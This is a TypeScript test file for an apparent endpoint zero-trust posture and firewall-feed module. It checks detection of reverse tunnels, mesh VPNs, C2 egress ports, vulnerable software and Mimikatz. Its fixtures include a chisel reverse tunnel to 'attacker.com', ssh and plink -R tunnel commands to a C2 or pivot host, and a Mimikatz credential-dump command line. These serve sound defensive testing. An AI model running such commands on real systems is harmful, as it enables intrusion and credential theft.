import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  detectReverseTunnels,
  evaluateZeroTrustPosture,
  evaluateFleetZeroTrustPosture,
  formatFirewallFeed,
  isValidIp,
  extractHostIp,
  TUNNEL_RADAR_RULES,
  C2_EGRESS_PORT_RULES,
  type QuarantineBlocklistEntry,
} from "./zerotrust-posture";

describe("Zero Trust Radar - Reverse Tunnel & Mesh Bypass Detection", () => {
  it("detects ngrok via process name, command line, and remote port", () => {
    // 1. Process name
    const findings1 = detectReverseTunnels({
      processes: [{ name: "ngrok.exe", path: "C:\\Tools\\ngrok.exe" }],
    });
    assert.ok(findings1.length > 0);
    assert.equal(findings1[0].tool, "ngrok");
    assert.equal(findings1[0].severity, "critical");

    // 2. Command line
    const findings2 = detectReverseTunnels({
      processes: [{ name: "tunnel.exe", command_line: "tunnel.exe ngrok http 8080" }],
    });
    assert.ok(findings2.length > 0);
    assert.equal(findings2[0].tool, "ngrok");

    // 3. Remote port 4443
    const findings3 = detectReverseTunnels({
      network_connections: {
        established_external_tcp: [
          { local_port: 52100, remote_address: "3.120.45.10", remote_port: 4443, state: "ESTABLISHED" },
        ],
      },
    });
    assert.ok(findings3.some((f) => f.tool === "ngrok"));
  });

  it("detects Cloudflare Tunnel (cloudflared) in user space", () => {
    const findings = detectReverseTunnels({
      processes: [
        { name: "cloudflared.exe", command_line: "cloudflared.exe tunnel run my-tunnel" },
      ],
    });
    assert.ok(findings.length > 0);
    const cloudflared = findings.find((f) => f.tool === "cloudflared");
    assert.ok(cloudflared);
    assert.equal(cloudflared.severity, "critical");
    assert.equal(cloudflared.category, "zero_trust_mesh");
  });

  it("detects Tailscale and ZeroTier mesh networks", () => {
    // Tailscale
    const tsFindings = detectReverseTunnels({
      processes: [{ name: "tailscaled.exe", command_line: "tailscaled.exe" }],
    });
    assert.ok(tsFindings.some((f) => f.tool === "tailscale" && f.severity === "high"));

    // ZeroTier
    const ztFindings = detectReverseTunnels({
      processes: [{ name: "zerotier-one.exe" }],
      network_connections: {
        listening_tcp_ports: [{ local_port: 9993, exposure: "all_interfaces" }],
      },
    });
    assert.ok(ztFindings.some((f) => f.tool === "zerotier"));
  });

  it("detects Tor anonymity proxies and onion routers", () => {
    const findings = detectReverseTunnels({
      processes: [{ name: "tor.exe" }],
      network_connections: {
        listening_tcp_ports: [{ local_port: 9050, exposure: "loopback" }],
      },
    });
    assert.ok(findings.some((f) => f.tool === "tor" && f.severity === "critical"));
  });

  it("detects Chisel HTTP/WebSocket reverse tunnels", () => {
    const findings = detectReverseTunnels({
      processes: [
        { name: "chisel.exe", command_line: "chisel.exe client https://attacker.com:8000 R:80:127.0.0.1:80" },
      ],
    });
    assert.ok(findings.length > 0);
    assert.equal(findings[0].tool, "chisel");
    assert.equal(findings[0].severity, "critical");
  });

  it("detects PuTTY Plink and OpenSSH reverse tunnels (-R / -D flags)", () => {
    // Plink -R
    const plinkFindings = detectReverseTunnels({
      processes: [
        { name: "plink.exe", command_line: "plink.exe -ssh -2 -P 22 -R 3389:127.0.0.1:3389 user@pivot.com" },
      ],
    });
    assert.ok(plinkFindings.some((f) => f.tool === "plink" && f.severity === "critical"));

    // OpenSSH -R
    const sshFindings = detectReverseTunnels({
      processes: [
        { name: "ssh.exe", command_line: "ssh.exe -N -R 2222:localhost:22 jump@c2.net" },
      ],
    });
    assert.ok(sshFindings.some((f) => f.tool === "ssh" && f.severity === "critical"));
  });

  it("detects unauthorized VPNs (WireGuard, OpenVPN, Hamachi)", () => {
    const findings = detectReverseTunnels({
      processes: [
        { name: "wireguard.exe" },
        { name: "openvpn.exe" },
        { name: "hamachi-2.exe" },
      ],
    });
    assert.equal(findings.length, 3);
    assert.ok(findings.every((f) => f.category === "unauthorized_vpn"));
  });

  it("detects frp (Fast Reverse Proxy) and bore tools", () => {
    const findings = detectReverseTunnels({
      processes: [
        { name: "frpc.exe", command_line: "frpc.exe -c frpc.ini" },
        { name: "bore.exe", command_line: "bore.exe local 8000 --to bore.pub" },
      ],
    });
    assert.ok(findings.some((f) => f.tool === "frp" && f.severity === "critical"));
    assert.ok(findings.some((f) => f.tool === "bore" && f.severity === "critical"));
  });

  it("contains complete catalog rules for all required tools and C2 ports", () => {
    const tools = TUNNEL_RADAR_RULES.map((r) => r.tool);
    assert.ok(tools.includes("ngrok"));
    assert.ok(tools.includes("cloudflared"));
    assert.ok(tools.includes("tailscale"));
    assert.ok(tools.includes("zerotier"));
    assert.ok(tools.includes("tor"));
    assert.ok(tools.includes("chisel"));
    assert.ok(tools.includes("plink"));
    assert.ok(tools.includes("ssh"));
    assert.ok(tools.includes("unauthorized_vpn"));
    assert.ok(tools.includes("frp"));
    assert.ok(tools.includes("bore"));

    const ports = C2_EGRESS_PORT_RULES.map((r) => r.port);
    assert.ok(ports.includes(4444));
    assert.ok(ports.includes(1337));
    assert.ok(ports.includes(3333));
    assert.ok(ports.includes(8443));
    assert.ok(ports.includes(6667));
  });
});

describe("Zero Trust Radar - C2 Egress Port Detection", () => {
  it("detects Metasploit egress on port 4444", () => {
    const findings = detectReverseTunnels({
      network_connections: {
        established_external_tcp: [
          { local_port: 49152, remote_address: "198.51.100.44", remote_port: 4444, state: "ESTABLISHED" },
        ],
      },
    });
    const c2 = findings.find((f) => f.remote_port === 4444);
    assert.ok(c2);
    assert.equal(c2.severity, "critical");
    assert.equal(c2.category, "unusual_c2_egress");
  });

  it("detects Elite C2 on port 1337 and Stratum mining C2 on port 3333", () => {
    const findings = detectReverseTunnels({
      network_connections: {
        established_external_tcp: [
          { local_port: 49200, remote_address: "203.0.113.13", remote_port: 1337, state: "ESTABLISHED" },
          { local_port: 49201, remote_address: "203.0.113.33", remote_port: 3333, state: "ESTABLISHED" },
        ],
      },
    });
    assert.ok(findings.some((f) => f.remote_port === 1337 && f.severity === "critical"));
    assert.ok(findings.some((f) => f.remote_port === 3333 && f.severity === "critical"));
  });

  it("detects Alt HTTPS port 8443 and IRC botnet port 6667 egress", () => {
    const findings = detectReverseTunnels({
      network_connections: {
        established_external_tcp: [
          { local_port: 50100, remote_address: "192.0.2.84", remote_port: 8443, state: "ESTABLISHED" },
          { local_port: 50101, remote_address: "192.0.2.66", remote_port: 6667, state: "ESTABLISHED" },
        ],
      },
    });
    assert.ok(findings.some((f) => f.remote_port === 8443 && f.severity === "high"));
    assert.ok(findings.some((f) => f.remote_port === 6667 && f.severity === "high"));
  });

  it("ignores closed or time-wait connections to C2 ports", () => {
    const findings = detectReverseTunnels({
      network_connections: {
        established_external_tcp: [
          { local_port: 50100, remote_address: "198.51.100.44", remote_port: 4444, state: "TIME_WAIT" },
          { local_port: 50101, remote_address: "198.51.100.45", remote_port: 1337, state: "closed" },
        ],
      },
    });
    assert.equal(findings.length, 0);
  });
});

describe("Zero Trust Device Posture Evaluation", () => {
  it("evaluates a clean, compliant machine as TRUSTED (score >= 80)", () => {
    const cleanMachine = {
      id: "mach-clean-01",
      hostname: "DESKTOP-FINANCE-01",
      ip: "192.168.10.55",
      unit: "Matriz São Paulo",
      status: "online",
      last_pulse: new Date().toISOString(),
      inventory_data: {
        software: [
          { name: "Google Chrome", version: "130.0.6723.92" },
          { name: "7-Zip", version: "24.08" },
          { name: "Notepad++", version: "8.6.9" },
        ],
        processes: [
          { name: "explorer.exe", path: "C:\\Windows\\explorer.exe" },
          { name: "chrome.exe", path: "C:\\Program Files\\Google\\Chrome\\chrome.exe" },
        ],
        network_connections: {
          listening_tcp_ports: [],
          established_external_tcp: [
            { local_port: 51200, remote_address: "142.250.190.46", remote_port: 443, state: "ESTABLISHED" },
          ],
        },
      },
    };

    const report = evaluateZeroTrustPosture(cleanMachine);
    assert.equal(report.verdict, "TRUSTED");
    assert.ok(report.posture_score >= 80, `Expected posture >= 80, got ${report.posture_score}`);
    assert.equal(report.quarantine_reasons.length, 0);
    assert.equal(report.tunnel_radar.has_tunnels, false);

    // Verify all 5 factors exist
    assert.equal(report.factors.length, 5);
    assert.ok(report.factors.every((f) => f.status === "pass"));
  });

  it("evaluates an endpoint with an active ngrok tunnel as QUARANTINED", () => {
    const infectedMachine = {
      id: "mach-tunnel-01",
      hostname: "SRV-TEST-DEV",
      ip: "10.0.1.200",
      unit: "Filial Curitiba",
      inventory_data: {
        processes: [
          { name: "ngrok.exe", command_line: "ngrok.exe http 3000" },
        ],
      },
    };

    const report = evaluateZeroTrustPosture(infectedMachine);
    assert.equal(report.verdict, "QUARANTINED");
    assert.ok(report.quarantine_reasons.some((r) => r.includes("ngrok")));
    assert.equal(report.tunnel_radar.has_tunnels, true);
    assert.ok(report.remediation_steps.length > 0);
  });

  it("evaluates an endpoint with C2 egress port 4444 as QUARANTINED", () => {
    const c2Machine = {
      id: "mach-c2-01",
      hostname: "WORKSTATION-HR",
      ip: "192.168.1.105",
      unit: "Unidade Sul",
      inventory_data: {
        network_connections: {
          established_external_tcp: [
            { local_port: 49500, remote_address: "45.33.32.156", remote_port: 4444, state: "ESTABLISHED" },
          ],
        },
      },
    };

    const report = evaluateZeroTrustPosture(c2Machine);
    assert.equal(report.verdict, "QUARANTINED");
    assert.ok(report.quarantine_reasons.some((r) => r.includes("4444") || r.includes("C2")));
  });

  it("evaluates an endpoint with CISA KEV or CVSS >= 9.0 vulnerability as QUARANTINED", () => {
    const vulnMachine = {
      id: "mach-vuln-01",
      hostname: "LINUX-DEV-01",
      ip: "10.10.5.20",
      unit: "Engenharia",
      inventory_data: {
        software: [
          // OpenSSH 9.5p1 is vulnerable to regreSSHion (CVE-2024-6387, CVSS 9.8, CISA KEV)
          { name: "OpenSSH", version: "9.5p1" },
        ],
      },
    };

    const report = evaluateZeroTrustPosture(vulnMachine);
    assert.equal(report.verdict, "QUARANTINED");
    assert.ok(report.quarantine_reasons.some((r) => r.includes("CISA KEV") || r.includes("CVSS")));
  });

  it("evaluates sensitive port (RDP 3389) on public interface as QUARANTINED", () => {
    const exposedMachine = {
      id: "mach-rdp-01",
      hostname: "WIN-SERVER-PUBLIC",
      ip: "200.180.20.10",
      unit: "Cloud AWS",
      inventory_data: {
        network_connections: {
          listening_tcp_ports: [
            { local_port: 3389, local_address: "0.0.0.0", exposure: "public_interface" },
          ],
        },
      },
    };

    const report = evaluateZeroTrustPosture(exposedMachine);
    assert.equal(report.verdict, "QUARANTINED");
    assert.ok(report.quarantine_reasons.some((r) => r.includes("3389")));
  });

  it("evaluates unapproved RAT or private listening port as RESTRICTED", () => {
    const restrictedMachine = {
      id: "mach-rmm-01",
      hostname: "LAPTOP-SUPPORT-02",
      ip: "192.168.2.45",
      unit: "Suporte Técnico",
      status: "online",
      last_pulse: new Date().toISOString(),
      inventory_data: {
        processes: [
          { name: "anydesk.exe", path: "C:\\Program Files\\AnyDesk\\anydesk.exe" },
        ],
        network_connections: {
          listening_tcp_ports: [
            { local_port: 3389, local_address: "192.168.2.45", exposure: "private_interface" },
          ],
        },
      },
    };

    const report = evaluateZeroTrustPosture(restrictedMachine);
    assert.equal(report.verdict, "RESTRICTED");
    assert.ok(report.posture_score < 80);
    assert.ok(report.posture_score >= 40);
  });

  it("evaluates Toxic Combinations or Mimikatz indicators as QUARANTINED", () => {
    const toxicMachine = {
      id: "mach-toxic-01",
      hostname: "DC-CONTROLLER-01",
      ip: "10.0.0.5",
      unit: "Infraestrutura",
      inventory_data: {
        processes: [
          { name: "mimikatz.exe", command_line: "mimikatz.exe sekurlsa::logonpasswords" },
        ],
      },
    };

    const report = evaluateZeroTrustPosture(toxicMachine);
    assert.equal(report.verdict, "QUARANTINED");
    assert.ok(report.quarantine_reasons.some((r) => r.includes("Mimikatz") || r.includes("credenciais")));
  });
});

describe("Fleet Zero Trust Posture Evaluation & Blocklist Aggregation", () => {
  it("evaluates a mixed fleet and correctly tallies summary counts and blocked IPs", () => {
    const fleet = [
      // 1. Clean machine -> TRUSTED
      {
        id: "m1",
        hostname: "host-clean-01",
        ip: "192.168.1.10",
        unit: "Filial A",
        status: "online",
        last_pulse: new Date().toISOString(),
      },
      // 2. Machine with ngrok -> QUARANTINED
      {
        id: "m2",
        hostname: "host-tunnel-02",
        ip: "192.168.1.20",
        unit: "Filial A",
        inventory_data: {
          processes: [{ name: "ngrok.exe" }],
        },
      },
      // 3. Machine with C2 port 1337 -> QUARANTINED
      {
        id: "m3",
        hostname: "host-c2-03",
        ip: "192.168.1.30",
        unit: "Filial B",
        inventory_data: {
          network_connections: {
            established_external_tcp: [
              { local_port: 50000, remote_address: "198.51.100.99", remote_port: 1337, state: "ESTABLISHED" },
            ],
          },
        },
      },
      // 4. Machine with unapproved AnyDesk -> RESTRICTED
      {
        id: "m4",
        hostname: "host-rmm-04",
        ip: "192.168.1.40",
        unit: "Filial B",
        status: "online",
        last_pulse: new Date().toISOString(),
        inventory_data: {
          processes: [{ name: "anydesk.exe" }],
        },
      },
    ];

    const fleetEval = evaluateFleetZeroTrustPosture(fleet);

    assert.equal(fleetEval.summary.total_evaluated, 4);
    assert.equal(fleetEval.summary.trusted_count, 1);
    assert.equal(fleetEval.summary.restricted_count, 1);
    assert.equal(fleetEval.summary.quarantined_count, 2);
    assert.equal(fleetEval.summary.quarantine_rate_percent, 50);
    assert.equal(fleetEval.summary.active_tunnels_count, 2);

    // Blocked IPs should include host IPs of quarantined machines + remote C2 IP
    assert.ok(fleetEval.blockedIps.includes("192.168.1.20"));
    assert.ok(fleetEval.blockedIps.includes("192.168.1.30"));
    assert.ok(fleetEval.blockedIps.includes("198.51.100.99"));

    // Quarantined hosts array
    assert.equal(fleetEval.quarantinedHosts.length, 2);
    assert.ok(fleetEval.quarantinedHosts.every((h) => h.verdict === "QUARANTINED"));
    assert.ok(fleetEval.quarantinedHosts.every((h) => h.recommended_firewall_action === "DROP"));
  });
});

describe("Firewall Threat Feed Formatting", () => {
  const dummyQuarantinedHosts: QuarantineBlocklistEntry[] = [
    {
      ip: "192.168.1.100",
      hostname: "HOST-INFECTED-01",
      machine_id: "m-01",
      unit: "Matriz SP",
      verdict: "QUARANTINED",
      reason: "Túnel reverso ngrok ativo",
      severity: "critical",
      quarantined_at: "2026-10-21T12:00:00Z",
      recommended_firewall_action: "DROP",
    },
    {
      ip: "10.0.1.50",
      hostname: "HOST-C2-02",
      machine_id: "m-02",
      unit: "Filial RJ",
      verdict: "QUARANTINED",
      reason: "Conexão de saída ativa porta 4444",
      severity: "critical",
      quarantined_at: "2026-10-21T12:00:00Z",
      recommended_firewall_action: "DROP",
    },
  ];

  const dummyBlockedIps = ["10.0.1.50", "192.168.1.100", "198.51.100.44"];

  it("formats feed as JSON with full metadata and summary", () => {
    const output = formatFirewallFeed(
      dummyQuarantinedHosts,
      dummyBlockedIps,
      "json",
      "tenant-uuid-123",
      { total_evaluated: 10, quarantined_count: 2 },
    );
    const parsed = JSON.parse(output);
    assert.equal(parsed.feed_type, "zerotrust_quarantine_feed");
    assert.equal(parsed.tenant_id, "tenant-uuid-123");
    assert.deepEqual(parsed.blocked_ips, dummyBlockedIps);
    assert.equal(parsed.quarantined_hosts.length, 2);
  });

  it("formats feed for pfSense / plain text URL table alias", () => {
    const output = formatFirewallFeed(
      dummyQuarantinedHosts,
      dummyBlockedIps,
      "pfsense",
      "tenant-uuid-123",
    );
    assert.ok(output.includes("# VextHub Zero Trust Quarantine Feed — pfSense"));
    assert.ok(output.includes("192.168.1.100 # HOST-INFECTED-01"));
    assert.ok(output.includes("10.0.1.50 # HOST-C2-02"));
    assert.ok(output.includes("198.51.100.44"));
  });

  it("formats feed for FortiGate External Threat Feed (IP Address)", () => {
    const output = formatFirewallFeed(
      dummyQuarantinedHosts,
      dummyBlockedIps,
      "fortigate",
      "tenant-uuid-123",
    );
    assert.ok(output.includes("# VextHub Zero Trust Threat Feed — FortiGate"));
    assert.ok(output.includes("10.0.1.50/32"));
    assert.ok(output.includes("192.168.1.100/32"));
    assert.ok(output.includes("198.51.100.44/32"));
  });

  it("formats feed as MikroTik RouterOS CLI script", () => {
    const output = formatFirewallFeed(
      dummyQuarantinedHosts,
      dummyBlockedIps,
      "mikrotik",
      "tenant-uuid-123",
    );
    assert.ok(output.includes("/ip firewall address-list remove [find list=VEXTHUB_QUARANTINE]"));
    assert.ok(output.includes("/ip firewall address-list add list=VEXTHUB_QUARANTINE address=192.168.1.100"));
    assert.ok(output.includes("/ip firewall address-list add list=VEXTHUB_QUARANTINE address=10.0.1.50"));
  });

  it("formats feed as Linux ipset & iptables script", () => {
    const output = formatFirewallFeed(
      dummyQuarantinedHosts,
      dummyBlockedIps,
      "iptables",
      "tenant-uuid-123",
    );
    assert.ok(output.startsWith("#!/bin/sh"));
    assert.ok(output.includes("ipset create vext_quarantine hash:ip -exist"));
    assert.ok(output.includes("ipset flush vext_quarantine"));
    assert.ok(output.includes("ipset add vext_quarantine 192.168.1.100"));
    assert.ok(output.includes("iptables -C FORWARD -m set --match-set vext_quarantine src -j DROP"));
  });
});

describe("Resilience & Edge Cases", () => {
  it("handles null, undefined, empty, and malformed inputs gracefully without throwing", () => {
    // 1. null / undefined machine
    const repNull = evaluateZeroTrustPosture(null);
    assert.equal(repNull.machine_id, "unknown-id");
    assert.equal(repNull.verdict, "TRUSTED");

    const repUndefined = evaluateZeroTrustPosture(undefined);
    assert.equal(repUndefined.machine_id, "unknown-id");

    // 2. empty fleet
    const fleetEmpty = evaluateFleetZeroTrustPosture([]);
    assert.equal(fleetEmpty.summary.total_evaluated, 0);
    assert.equal(fleetEmpty.quarantinedHosts.length, 0);

    // 3. invalid / non-array fleet
    const fleetNull = evaluateFleetZeroTrustPosture(null as unknown as unknown[]);
    assert.equal(fleetNull.summary.total_evaluated, 0);

    // 4. empty firewall feed
    const plainEmpty = formatFirewallFeed([], [], "plain");
    assert.ok(plainEmpty.includes("# No active quarantined hosts"));

    const mikrotikEmpty = formatFirewallFeed([], [], "mikrotik");
    assert.ok(mikrotikEmpty.includes("# No quarantined hosts to add"));
  });

  it("validates and filters valid vs invalid IPv4 and IPv6 addresses", () => {
    assert.equal(isValidIp("192.168.1.1"), true);
    assert.equal(isValidIp("10.0.0.254"), true);
    assert.equal(isValidIp("2001:db8::1"), true);

    // Rejections
    assert.equal(isValidIp("127.0.0.1"), false);
    assert.equal(isValidIp("0.0.0.0"), false);
    assert.equal(isValidIp("::1"), false);
    assert.equal(isValidIp(""), false);
    assert.equal(isValidIp("999.999.999.999"), false);
    assert.equal(isValidIp("not-an-ip"), false);
  });

  it("extracts host IP from different inventory shapes", () => {
    assert.equal(extractHostIp({ ip: "10.0.0.1" }), "10.0.0.1");
    assert.equal(extractHostIp({ inventory_data: { system_details: { local_ip: "10.0.0.2" } } }), "10.0.0.2");
    assert.equal(extractHostIp({ inventory_data: { system_details: { external_ip: "200.50.10.5" } } }), "200.50.10.5");
    assert.equal(extractHostIp({ inventory_data: { local_ip: "10.0.0.3" } }), "10.0.0.3");
    assert.equal(extractHostIp(null), "0.0.0.0");
  });
});
